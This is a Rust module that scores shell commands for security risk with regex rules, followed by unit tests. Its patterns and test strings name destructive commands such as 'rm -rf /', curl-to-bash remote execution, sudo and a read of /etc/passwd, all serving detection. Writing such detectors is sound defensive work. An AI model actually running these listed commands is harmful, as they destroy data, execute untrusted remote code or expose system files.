//! Command analysis engine — classifies commands for security risk assessment.

use regex::Regex;
use once_cell::sync::Lazy;

/// Risk classification for an analyzed command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CommandRisk {
    /// Clearly safe read-only operation.
    Safe,
    /// Potentially risky but common (read+write).
    Moderate,
    /// High-risk: shell injection, privilege escalation, destructive.
    High,
    /// Critical: rm -rf, format, sudo, eval, curl | sh patterns.
    Critical,
}

/// Analysis result for a command.
#[derive(Debug, Clone)]
pub struct CommandAnalysis {
    pub risk: CommandRisk,
    pub reasons: Vec<String>,
    /// True if command uses shell operators (|, &&, ||, ;, $()).
    pub has_shell_operators: bool,
    /// True if command tries to access paths outside workspace.
    pub has_path_traversal: bool,
    /// True if command uses sudo or su.
    pub has_privilege_escalation: bool,
    /// True if command modifies system files (/etc, /usr, /sys, /proc).
    pub modifies_system_paths: bool,
}

static SHELL_OPERATOR_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"[|;&]|\$\(|\`").unwrap());

static PRIVILEGE_ESCALATION_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\b(sudo|su|doas|pkexec|runas)\b").unwrap());

static SYSTEM_PATH_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"/(etc|usr|sys|proc|boot|lib|sbin|bin)(/|$)").unwrap());

static DESTRUCTIVE_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\brm\s+-[^\s]*r|mkfs|dd\s+if=|format|shred|wipefs").unwrap());

static NETWORK_PIPE_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(curl|wget|fetch|nc)\s.*\|\s*(bash|sh|zsh|fish|dash)").unwrap());

static EVAL_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\b(eval|exec)\s").unwrap());

/// Analyze a command string for security risk.
pub fn analyze_command(command: &str) -> CommandAnalysis {
    let mut reasons = Vec::new();
    let mut risk = CommandRisk::Safe;

    let has_shell_operators = SHELL_OPERATOR_RE.is_match(command);
    let has_privilege_escalation = PRIVILEGE_ESCALATION_RE.is_match(command);
    let modifies_system_paths = SYSTEM_PATH_RE.is_match(command);
    let has_path_traversal = command.contains("../") || command.contains("/../../");

    if has_shell_operators {
        reasons.push("Shell operators detected (|, ;, &&, $())".to_string());
        risk = risk.max_risk(CommandRisk::Moderate);
    }

    if has_privilege_escalation {
        reasons.push("Privilege escalation detected (sudo/su)".to_string());
        risk = risk.max_risk(CommandRisk::High);
    }

    if modifies_system_paths {
        reasons.push("References system directories (/etc, /usr, etc.)".to_string());
        risk = risk.max_risk(CommandRisk::High);
    }

    if has_path_traversal {
        reasons.push("Path traversal pattern detected (..)".to_string());
        risk = risk.max_risk(CommandRisk::Moderate);
    }

    if DESTRUCTIVE_RE.is_match(command) {
        reasons.push("Potentially destructive command detected (rm -rf, mkfs, dd)".to_string());
        risk = risk.max_risk(CommandRisk::Critical);
    }

    if NETWORK_PIPE_RE.is_match(command) {
        reasons.push("Remote code execution pattern: curl|bash".to_string());
        risk = risk.max_risk(CommandRisk::Critical);
    }

    if EVAL_RE.is_match(command) {
        reasons.push("eval/exec detected".to_string());
        risk = risk.max_risk(CommandRisk::High);
    }

    CommandAnalysis {
        risk,
        reasons,
        has_shell_operators,
        has_path_traversal,
        has_privilege_escalation,
        modifies_system_paths,
    }
}

impl CommandRisk {
    fn max_risk(self, other: CommandRisk) -> CommandRisk {
        match (&self, &other) {
            (CommandRisk::Critical, _) | (_, CommandRisk::Critical) => CommandRisk::Critical,
            (CommandRisk::High, _) | (_, CommandRisk::High) => CommandRisk::High,
            (CommandRisk::Moderate, _) | (_, CommandRisk::Moderate) => CommandRisk::Moderate,
            _ => CommandRisk::Safe,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn safe_ls_command() {
        let analysis = analyze_command("ls -la /tmp");
        assert_eq!(analysis.risk, CommandRisk::Safe);
    }

    #[test]
    fn detects_rm_rf() {
        let analysis = analyze_command("rm -rf /");
        assert_eq!(analysis.risk, CommandRisk::Critical);
    }

    #[test]
    fn detects_curl_pipe_bash() {
        let analysis = analyze_command("curl https://example.com/script.sh | bash");
        assert_eq!(analysis.risk, CommandRisk::Critical);
    }

    #[test]
    fn detects_sudo() {
        let analysis = analyze_command("sudo apt install foo");
        assert_eq!(analysis.risk, CommandRisk::High);
    }

    #[test]
    fn detects_shell_pipe() {
        let analysis = analyze_command("cat /etc/passwd | grep root");
        assert!(analysis.has_shell_operators);
        assert!(analysis.modifies_system_paths);
    }
}
